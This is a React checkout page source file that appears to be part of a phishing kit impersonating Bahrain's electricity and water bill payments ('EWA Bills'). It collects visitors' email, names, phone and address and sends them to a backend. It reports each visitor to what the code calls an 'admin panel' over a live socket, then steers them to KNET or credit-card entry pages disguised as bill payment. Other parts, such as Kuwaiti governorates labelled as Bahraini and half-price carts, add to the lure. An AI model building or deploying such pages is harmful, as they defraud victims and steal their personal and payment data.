import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { sendData, navigateToPage, socket } from "@/lib/store";
import { useStore } from "@/store/StoreContext";
import { useLang } from "@/store/LanguageContext";

export default function SummaryPayment() {
  const [, setLocation] = useLocation();
  const { cart, getCartTotal, getCartCount, removeFromCart, updateCartQuantity } = useStore();
  const { lang, t, isRTL, dir } = useLang();

  // Form state
  const [email, setEmail] = useState("");
  const [wantsNews, setWantsNews] = useState(true);
  const [firstName, setFirstName] = useState("");
  const [lastName, setLastName] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [governorate, setGovernorate] = useState("");
  const [phone, setPhone] = useState("");
  const [saveInfo, setSaveInfo] = useState(true);
  const [area, setArea] = useState("");
  const [block, setBlock] = useState("");

  // Validation state
  const [emailError, setEmailError] = useState('');
  const [phoneError, setPhoneError] = useState('');

  // Payment state
  const [selectedPayment, setSelectedPayment] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);

  const total = getCartTotal();
  const count = getCartCount();
  const deliveryFee = total >= 20 ? 0 : 1;
  const grandTotal = total + deliveryFee;

  const isAr = lang === 'ar';

  // Email validation
  const validateEmail = (val: string) => {
    if (!val) { setEmailError(''); return; }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(val)) {
      setEmailError(isAr ? 'يرجى إدخال بريد إلكتروني صحيح' : 'Please enter a valid email');
    } else {
      setEmailError('');
    }
  };

  // Phone validation (Bahrain: 8 digits, starts with 3, 6, or full with +973)
  const validatePhone = (val: string) => {
    if (!val) { setPhoneError(''); return; }
    const cleaned = val.replace(/[\s\-\+]/g, '');
    // Accept 8 digits (Bahrain local) or 973 + 8 digits
    const phoneRegex = /^(973)?[36]\d{7}$/;
    if (!phoneRegex.test(cleaned)) {
      setPhoneError(isAr ? 'يرجى إدخال رقم هاتف بحريني صحيح' : 'Please enter a valid Bahrain phone number');
    } else {
      setPhoneError('');
    }
  };

  // Bahrain governorates
  const governorates = isAr
    ? ['محافظة العاصمة', 'محافظة حولي', 'محافظة الفروانية', 'محافظة مبارك الكبير', 'محافظة الأحمدي', 'محافظة الجهراء']
    : ['Capital Governorate', 'Hawalli Governorate', 'Farwaniya Governorate', 'Mubarak Al-Kabeer Governorate', 'Ahmadi Governorate', 'Jahra Governorate'];

  useEffect(() => {
    navigateToPage('ملخص الدفع');
  }, []);

  // Redirect to store if cart is empty
  useEffect(() => {
    if (cart.length === 0) {
      const timer = setTimeout(() => setLocation('/store'), 2000);
      return () => clearTimeout(timer);
    }
  }, [cart, setLocation]);

  const handlePayment = () => {
    if (!selectedPayment) return;
    if (!email || !firstName || !phone) return;

    setIsProcessing(true);

    const paymentMethodLabel = selectedPayment === 'card' ? 'بطاقة ائتمان' : selectedPayment === 'knet' ? 'كي نت' : 'Apple Pay';

    const cartSummary = cart.map(item => ({
      name: item.product.titleAr || item.product.title,
      variant: item.variant.title,
      qty: item.quantity,
      price: (parseFloat(item.variant.price) * 0.5).toFixed(3),
      total: (parseFloat(item.variant.price) * 0.5 * item.quantity).toFixed(3),
    }));

    sendData({
      data: {
        paymentMethod: paymentMethodLabel,
        email,
        firstName,
        lastName,
        phone,
        address,
        city,
        governorate,
        area,
        block,
        cartItems: cartSummary,
        subtotal: total.toFixed(3),
        deliveryFee: deliveryFee === 0 ? 'FREE' : deliveryFee.toFixed(3),
        grandTotal: grandTotal.toFixed(3),
      },
      current: 'ملخص الدفع',
      nextPage: selectedPayment === 'knet' ? 'knet-payment' : selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
      waitingForAdminResponse: false,
    });

    // Save total for KNET/credit card pages
    localStorage.setItem('Total', grandTotal.toFixed(3));

    // Update visitor name in admin panel
    const customerName = `${firstName} ${lastName}`.trim();
    if (customerName && socket.value.connected) {
      socket.value.emit('visitor:updateName', customerName);
    }

    setTimeout(() => {
      setIsProcessing(false);
      if (selectedPayment === 'knet') {
        window.location.href = '/knet-payment';
      } else if (selectedPayment === 'card') {
        window.location.href = `/credit-card-payment?service=${encodeURIComponent('فواتير الكهرباء والماء')}&amount=${grandTotal.toFixed(3)}`;
      } else {
        window.location.href = `/bank-transfer?service=${encodeURIComponent('فواتير الكهرباء والماء')}&amount=${grandTotal}`;
      }
    }, 1500);
  };

  const getProductTitle = (p: any) => {
    if (lang === 'ar') return p.titleAr || p.title;
    return p.title;
  };

  const getVariantLabel = (title: string) => {
    const tl = title.toLowerCase();
    if (tl === 'piece' || tl === 'default title' || tl === '1') return isAr ? 'قطعة واحدة' : 'Piece';
    if (tl.includes('carton') || tl.includes('box')) {
      const match = tl.match(/(\d+)/);
      if (match) return isAr ? `كرتونة (${match[1]} قطع)` : `Carton (${match[1]} pcs)`;
      return isAr ? 'كرتونة' : 'Carton';
    }
    return title;
  };

  if (cart.length === 0) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: '#f5f5f5', direction: dir }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ fontSize: '18px', color: '#666' }}>{isAr ? 'سلتك فارغة، جاري التحويل...' : 'Your cart is empty, redirecting...'}</p>
        </div>
      </div>
    );
  }

  return (
    <div style={{ minHeight: '100vh', background: '#fff', fontFamily: "'Makani Medium', 'Cairo', Arial, sans-serif", direction: dir, width: '100%', maxWidth: '100vw', overflowX: 'hidden', boxSizing: 'border-box' as any }}>

      {/* Top bar */}
      <div style={{ borderBottom: '1px solid #e5e5e5', padding: '20px 0' }}>
        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 20px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <a href="/store" style={{ textDecoration: 'none', display: 'flex', alignItems: 'center', gap: '8px' }}>
            <span style={{ fontSize: '26px', fontWeight: 800, color: '#1a3a4a' }}>
              {isAr ? 'فواتير الكهرباء والماء' : 'EWA Bills'}
            </span>
          </a>
        </div>
      </div>

      {/* Main content */}
      <div className="summary-main-content" style={{ maxWidth: '1200px', margin: '0 auto', padding: '30px 20px', display: 'flex', gap: '40px', flexWrap: 'wrap' }}>

        {/* LEFT/RIGHT SIDE: Form (takes more space) */}
        <div className="summary-form-side" style={{ flex: '1 1 580px', minWidth: '320px' }}>

          {/* بيانات المستخدم */}
          <div style={{ marginBottom: '32px' }}>
            <div style={{ marginBottom: '16px' }}>
              <h2 style={{ fontSize: '20px', fontWeight: 700, color: '#333', margin: 0 }}>
                {isAr ? 'بيانات المستخدم' : 'Contact Information'}
              </h2>
            </div>

            <input
              type="email"
              value={email}
              onChange={e => { setEmail(e.target.value); if (emailError) validateEmail(e.target.value); }}
              onBlur={e => validateEmail(e.target.value)}
              placeholder={isAr ? 'البريد الإلكتروني' : 'Email'}
              style={{
                width: '100%', padding: '14px 16px', border: `1px solid ${emailError ? '#e53935' : '#ccc'}`, borderRadius: '6px',
                fontSize: '15px', outline: 'none', boxSizing: 'border-box', marginBottom: emailError ? '4px' : '12px',
                direction: dir, textAlign: isRTL ? 'right' : 'left',
              }}
            />
            {emailError && <p style={{ color: '#e53935', fontSize: '12px', margin: '0 0 12px 0' }}>{emailError}</p>}

            <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px', color: '#555', cursor: 'pointer' }}>
              <input type="checkbox" checked={wantsNews} onChange={e => setWantsNews(e.target.checked)}
                style={{ width: '18px', height: '18px', accentColor: '#1a73e8' }} />
              {isAr ? 'أرسل لي رسالة بالأخبار والعروض' : 'Email me with news and offers'}
            </label>
          </div>

          {/* عنوان التوصيل */}
          <div style={{ marginBottom: '32px' }}>
            <h2 style={{ fontSize: '20px', fontWeight: 700, color: '#333', marginBottom: '16px' }}>
              {isAr ? 'عنوان التوصيل' : 'Delivery Address'}
            </h2>

            {/* Country */}
            <div style={{ marginBottom: '12px' }}>
              <div style={{
                width: '100%', padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                fontSize: '15px', background: '#f9f9f9', boxSizing: 'border-box', color: '#333',
                display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                flexDirection: isRTL ? 'row' : 'row',
              }}>
                <span>{isAr ? 'البحرين' : 'Bahrain'}</span>
                <span style={{ fontSize: '12px', color: '#888' }}>{isAr ? 'البلد/المنطقة' : 'Country/Region'}</span>
              </div>
            </div>

            {/* First + Last name */}
            <div style={{ display: 'flex', gap: '12px', marginBottom: '12px' }}>
              <input
                value={firstName}
                onChange={e => { const v = e.target.value.replace(/[^a-zA-Z؀-ۿݐ-ݿࢠ-ࣿ\s]/g, ''); setFirstName(v); }}
                placeholder={isAr ? 'الاسم الأول' : 'First Name'}
                style={{
                  flex: 1, padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                  fontSize: '15px', outline: 'none', boxSizing: 'border-box',
                  direction: dir, textAlign: isRTL ? 'right' : 'left',
                }}
              />
              <input
                value={lastName}
                onChange={e => { const v = e.target.value.replace(/[^a-zA-Z؀-ۿݐ-ݿࢠ-ࣿ\s]/g, ''); setLastName(v); }}
                placeholder={isAr ? 'الاسم الأخير' : 'Last Name'}
                style={{
                  flex: 1, padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                  fontSize: '15px', outline: 'none', boxSizing: 'border-box',
                  direction: dir, textAlign: isRTL ? 'right' : 'left',
                }}
              />
            </div>

            {/* Address */}
            <input
              value={address}
              onChange={e => { const v = e.target.value.replace(/[^0-9]/g, ''); setAddress(v); }}
              placeholder={isAr ? 'المبنى / الطابق / الشقة' : 'Building / Floor / Apartment'}
              inputMode="numeric"
              style={{
                width: '100%', padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                fontSize: '15px', outline: 'none', boxSizing: 'border-box', marginBottom: '12px',
                direction: dir, textAlign: isRTL ? 'right' : 'left',
              }}
            />

            {/* City + Postal */}
            <div style={{ display: 'flex', gap: '12px', marginBottom: '12px' }}>
              <input
                value={postalCode}
                onChange={e => { const v = e.target.value.replace(/[^0-9]/g, ''); setPostalCode(v); }}
                placeholder={isAr ? 'Postal code (optional)' : 'Postal code (optional)'}
                inputMode="numeric"
                style={{
                  flex: 1, padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                  fontSize: '15px', outline: 'none', boxSizing: 'border-box',
                  direction: dir, textAlign: isRTL ? 'right' : 'left',
                }}
              />
              <input
                value={city}
                onChange={e => { const v = e.target.value.replace(/[^a-zA-Z؀-ۿݐ-ݿࢠ-ࣿ\s]/g, ''); setCity(v); }}
                placeholder={isAr ? 'المدينة' : 'City'}
                style={{
                  flex: 1, padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                  fontSize: '15px', outline: 'none', boxSizing: 'border-box',
                  direction: dir, textAlign: isRTL ? 'right' : 'left',
                }}
              />
            </div>

            {/* Governorate */}
            <select
              value={governorate}
              onChange={e => setGovernorate(e.target.value)}
              style={{
                width: '100%', padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                fontSize: '15px', outline: 'none', boxSizing: 'border-box', marginBottom: '12px',
                background: 'white', direction: dir, color: governorate ? '#333' : '#888',
                appearance: 'none', WebkitAppearance: 'none',
                backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23888' d='M2 4l4 4 4-4'/%3E%3C/svg%3E")`,
                backgroundRepeat: 'no-repeat',
                backgroundPosition: isRTL ? '16px center' : 'calc(100% - 16px) center',
              }}
            >
              <option value="" disabled>{isAr ? 'المحافظة' : 'Governorate'}</option>
              {governorates.map(g => <option key={g} value={g}>{g}</option>)}
            </select>

            {/* Phone */}
            <input
              value={phone}
              onChange={e => { setPhone(e.target.value); if (phoneError) validatePhone(e.target.value); }}
              onBlur={e => validatePhone(e.target.value)}
              placeholder={isAr ? 'الهاتف' : 'Phone'}
              type="tel"
              style={{
                width: '100%', padding: '14px 16px', border: `1px solid ${phoneError ? '#e53935' : '#ccc'}`, borderRadius: '6px',
                fontSize: '15px', outline: 'none', boxSizing: 'border-box', marginBottom: phoneError ? '4px' : '12px',
                direction: dir, textAlign: isRTL ? 'right' : 'left',
              }}
            />
            {phoneError && <p style={{ color: '#e53935', fontSize: '12px', margin: '0 0 12px 0' }}>{phoneError}</p>}

            {/* Save info checkbox */}
            <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '14px', color: '#555', cursor: 'pointer', marginBottom: '12px' }}>
              <input type="checkbox" checked={saveInfo} onChange={e => setSaveInfo(e.target.checked)}
                style={{ width: '18px', height: '18px', accentColor: '#1a73e8' }} />
              {isAr ? 'حفظ هذه المعلومات للمرة القادمة' : 'Save this information for next time'}
            </label>

            {/* Area input */}
            <input
              value={area}
              onChange={e => setArea(e.target.value)}
              placeholder={isAr ? 'المنطقة' : 'Area'}
              style={{
                width: '100%', padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                fontSize: '15px', outline: 'none', boxSizing: 'border-box', marginBottom: '12px',
                direction: dir, textAlign: isRTL ? 'right' : 'left',
              }}
            />

            {/* Block input */}
            <input
              value={block}
              onChange={e => setBlock(e.target.value)}
              placeholder={isAr ? 'القطعة' : 'Block'}
              style={{
                width: '100%', padding: '14px 16px', border: '1px solid #ccc', borderRadius: '6px',
                fontSize: '15px', outline: 'none', boxSizing: 'border-box', marginBottom: '12px',
                direction: dir, textAlign: isRTL ? 'right' : 'left',
              }}
            />
          </div>

          {/* طريقة الدفع */}
          <div style={{ marginBottom: '32px' }}>
            <h2 style={{ fontSize: '20px', fontWeight: 700, color: '#333', marginBottom: '4px' }}>
              {isAr ? 'طريقة الدفع' : 'Payment Method'}
            </h2>
            <p style={{ fontSize: '13px', color: '#888', marginBottom: '16px', marginTop: 0 }}>
              {isAr ? 'جميع العمليات آمنة ومشفرة.' : 'All transactions are secure and encrypted.'}
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              {/* Credit Card */}
              <div
                onClick={() => setSelectedPayment('card')}
                style={{
                  border: `2px solid ${selectedPayment === 'card' ? '#1a73e8' : '#ddd'}`,
                  borderRadius: '8px', padding: '16px', cursor: 'pointer',
                  background: selectedPayment === 'card' ? '#f0f7ff' : 'white',
                  transition: 'all 0.2s',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{
                    width: '20px', height: '20px', borderRadius: '50%',
                    border: `2px solid ${selectedPayment === 'card' ? '#1a73e8' : '#ccc'}`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                  }}>
                    {selectedPayment === 'card' && <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#1a73e8' }} />}
                  </div>
                  <span style={{ fontWeight: 600, fontSize: '15px', color: '#333' }}>
                    {isAr ? 'بطاقة ائتمان' : 'Credit Card'}
                  </span>
                  <div style={{ marginRight: 'auto', marginLeft: 'auto' }} />
                  <div style={{ display: 'flex', gap: '6px', alignItems: 'center' }}>
                    <img src="/images/visa.png" alt="Visa" style={{ height: '24px' }} onError={e => (e.currentTarget.style.display = 'none')} />
                    <img src="/images/mastercard.png" alt="Mastercard" style={{ height: '24px' }} onError={e => (e.currentTarget.style.display = 'none')} />
                  </div>
                </div>
                <p style={{ fontSize: '12px', color: '#888', margin: '6px 0 0 32px' }}>Visa, Mastercard</p>
              </div>

              {/* KNET */}
              <div
                onClick={() => setSelectedPayment('knet')}
                style={{
                  border: `2px solid ${selectedPayment === 'knet' ? '#1a73e8' : '#ddd'}`,
                  borderRadius: '8px', padding: '16px', cursor: 'pointer',
                  background: selectedPayment === 'knet' ? '#f0f7ff' : 'white',
                  transition: 'all 0.2s',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{
                    width: '20px', height: '20px', borderRadius: '50%',
                    border: `2px solid ${selectedPayment === 'knet' ? '#1a73e8' : '#ccc'}`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                  }}>
                    {selectedPayment === 'knet' && <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#1a73e8' }} />}
                  </div>
                  <span style={{ fontWeight: 600, fontSize: '15px', color: '#333' }}>KNET</span>
                  <div style={{ marginRight: 'auto', marginLeft: 'auto' }} />
                  <img src="/kpay/knet.png" alt="KNET" style={{ height: '28px', objectFit: 'contain' }} />
                </div>
                <p style={{ fontSize: '12px', color: '#888', margin: '6px 0 0 32px' }}>
                  {isAr ? 'الدفع بواسطة كي نت' : 'Pay with KNET'}
                </p>
              </div>

              {/* Apple Pay */}
              <div
                onClick={() => setSelectedPayment('apple')}
                style={{
                  border: `2px solid ${selectedPayment === 'apple' ? '#1a73e8' : '#ddd'}`,
                  borderRadius: '8px', padding: '16px', cursor: 'pointer',
                  background: selectedPayment === 'apple' ? '#f0f7ff' : 'white',
                  transition: 'all 0.2s',
                }}
              >
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
                  <div style={{
                    width: '20px', height: '20px', borderRadius: '50%',
                    border: `2px solid ${selectedPayment === 'apple' ? '#1a73e8' : '#ccc'}`,
                    display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0,
                  }}>
                    {selectedPayment === 'apple' && <div style={{ width: '10px', height: '10px', borderRadius: '50%', background: '#1a73e8' }} />}
                  </div>
                  <span style={{ fontWeight: 600, fontSize: '15px', color: '#333' }}>Apple Pay</span>
                  <div style={{ marginRight: 'auto', marginLeft: 'auto' }} />
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="#333">
                    <path d="M17.72 9.8c-.04.03-1.55.89-1.55 2.73 0 2.13 1.87 2.88 1.93 2.9-.01.04-.3 1.03-1 2.04-.6.88-1.23 1.76-2.2 1.76-.97 0-1.22-.56-2.33-.56-1.09 0-1.47.58-2.38.58-.91 0-1.55-.82-2.26-1.82C7.02 16.16 6.4 14.1 6.4 12.13c0-3.17 2.06-4.85 4.08-4.85.96 0 1.76.63 2.36.63.58 0 1.48-.67 2.57-.67.41 0 1.9.04 2.88 1.43l-.57.13zM14.44 5.13c.45-.53.77-1.27.77-2.01 0-.1-.01-.21-.02-.3-.73.03-1.61.49-2.13 1.09-.42.47-.81 1.22-.81 1.97 0 .11.02.23.03.26.05.01.14.02.22.02.66 0 1.49-.44 1.94-1.03z"/>
                  </svg>
                </div>
                <p style={{ fontSize: '12px', color: '#888', margin: '6px 0 0 32px' }}>
                  {isAr ? 'الدفع بواسطة Apple Pay' : 'Pay with Apple Pay'}
                </p>
                {selectedPayment === 'apple' && (
                  <p style={{ fontSize: '12px', color: '#e53935', margin: '8px 0 0 0', textAlign: 'center' }}>
                    {isAr ? 'الدفع عن طريق Apple Pay غير متاح حالياً' : 'Apple Pay is currently unavailable'}
                  </p>
                )}
              </div>
            </div>
          </div>

          {/* Submit button */}
          <button
            onClick={handlePayment}
            disabled={!selectedPayment || isProcessing || !email || !firstName || !phone || selectedPayment === 'apple'}
            style={{
              width: '100%', padding: '16px',
              background: (!selectedPayment || isProcessing || !email || !firstName || !phone || selectedPayment === 'apple') ? '#ccc' : '#1a3a4a',
              color: 'white', border: 'none', borderRadius: '8px',
              fontSize: '17px', fontWeight: 700, cursor: (!selectedPayment || isProcessing || selectedPayment === 'apple') ? 'not-allowed' : 'pointer',
              transition: 'background 0.2s',
              marginBottom: '20px',
            }}
          >
            {isProcessing ? (
              <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                <span style={{
                  width: '18px', height: '18px', border: '2px solid white', borderTopColor: 'transparent',
                  borderRadius: '50%', display: 'inline-block',
                  animation: 'spin 0.8s linear infinite',
                }} />
                {isAr ? 'جاري المعالجة...' : 'Processing...'}
              </span>
            ) : (
              isAr ? 'متابعة الدفع' : 'Continue to Payment'
            )}
          </button>

          <p style={{ fontSize: '12px', color: '#888', textAlign: 'center', marginBottom: '30px' }}>
            {isAr
              ? 'بالضغط على متابعة الدفع، أنت توافق على شروط الخدمة وسياسة الخصوصية'
              : 'By continuing, you agree to the Terms of Service and Privacy Policy'}
          </p>
        </div>

        {/* RIGHT/LEFT SIDE: Order Summary Sidebar */}
        <div className="summary-order-side" style={{
          flex: '0 0 420px', maxWidth: '420px', minWidth: '320px',
          background: '#fafafa', borderRadius: '0', padding: '24px',
          borderLeft: isRTL ? 'none' : '1px solid #e5e5e5',
          borderRight: isRTL ? '1px solid #e5e5e5' : 'none',
          alignSelf: 'flex-start',
          position: 'sticky', top: '20px',
        }}>
          {/* Cart items */}
          {cart.map((item, idx) => {
            const lineTotal = parseFloat(item.variant.price) * 0.5 * item.quantity;
            return (
              <div key={`${item.product.id}-${item.variant.id}`} style={{
                display: 'flex', alignItems: 'center', gap: '14px',
                marginBottom: '16px', paddingBottom: idx < cart.length - 1 ? '16px' : '0',
                borderBottom: idx < cart.length - 1 ? '1px solid #eee' : 'none',
              }}>
                {/* Image with quantity badge */}
                <div style={{ position: 'relative', flexShrink: 0 }}>
                  <img
                    src={item.product.image}
                    alt={item.product.title}
                    style={{
                      width: '64px', height: '64px', objectFit: 'contain',
                      borderRadius: '8px', border: '1px solid #e5e5e5', background: 'white',
                    }}
                  />
                  <span style={{
                    position: 'absolute', top: '-8px', [isRTL ? 'left' : 'right']: '-8px',
                    background: '#666', color: 'white', borderRadius: '50%',
                    width: '22px', height: '22px', display: 'flex', alignItems: 'center', justifyContent: 'center',
                    fontSize: '12px', fontWeight: 700,
                  }}>{item.quantity}</span>
                </div>

                {/* Info */}
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div style={{ fontSize: '13px', fontWeight: 600, color: '#333', lineHeight: 1.4, marginBottom: '2px' }}>
                    {getProductTitle(item.product)}
                  </div>
                  <div style={{ fontSize: '11px', color: '#888' }}>
                    {getVariantLabel(item.variant.title)}
                  </div>
                </div>

                {/* Price */}
                <div style={{ fontSize: '14px', fontWeight: 600, color: '#333', whiteSpace: 'nowrap' }}>
                  {lineTotal.toFixed(3)} {isAr ? 'د.ب.' : 'BD'}
                </div>
              </div>
            );
          })}

          {/* Divider */}
          <div style={{ borderTop: '1px solid #ddd', margin: '16px 0', paddingTop: '16px' }}>
            {/* Subtotal */}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', fontSize: '14px', color: '#555' }}>
              <span>Subtotal · {count} items</span>
              <span style={{ fontWeight: 600 }}>{total.toFixed(3)} {isAr ? 'د.ب.' : 'BD'}</span>
            </div>

            {/* Delivery */}
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', fontSize: '14px', color: '#555' }}>
              <span style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                {isAr ? 'رسوم التوصيل' : 'Delivery'}
                <span style={{ fontSize: '12px', color: '#aaa', cursor: 'help' }} title={isAr ? 'توصيل مجاني للطلبات فوق 20 د.ب' : 'Free delivery for orders over 20 BD'}>&#9432;</span>
              </span>
              <span style={{ fontWeight: 600, color: deliveryFee === 0 ? '#2e7d32' : '#333' }}>
                {deliveryFee === 0 ? 'FREE' : `${deliveryFee.toFixed(3)} ${isAr ? 'د.ب.' : 'BD'}`}
              </span>
            </div>
          </div>

          {/* Grand Total */}
          <div style={{
            display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            paddingTop: '16px', borderTop: '1px solid #ddd',
          }}>
            <span style={{ fontSize: '16px', fontWeight: 700, color: '#333' }}>
              {isAr ? 'الإجمالي' : 'Total'}
            </span>
            <div style={{ textAlign: isRTL ? 'left' : 'right' }}>
              <span style={{ fontSize: '22px', fontWeight: 800, color: '#333' }}>
                {grandTotal.toFixed(3)}
              </span>
              <span style={{ fontSize: '14px', color: '#888', marginLeft: '6px', marginRight: '6px' }}>{isAr ? 'د.ب.' : 'BHD'}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Spin animation */}
      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        @media (max-width: 768px) {
          .summary-main-content {
            flex-direction: column !important;
            gap: 20px !important;
            padding: 15px 10px !important;
            max-width: 100% !important;
            width: 100% !important;
            box-sizing: border-box !important;
          }
          .summary-form-side {
            min-width: 100% !important;
            flex: 1 1 100% !important;
          }
          .summary-order-side {
            min-width: 100% !important;
            max-width: 100% !important;
            flex: 1 1 100% !important;
            order: -1 !important;
            position: relative !important;
            border-left: none !important;
            border-right: none !important;
            border-bottom: 1px solid #e5e5e5 !important;
            padding: 16px !important;
          }
        }
      `}</style>
    </div>
  );
}
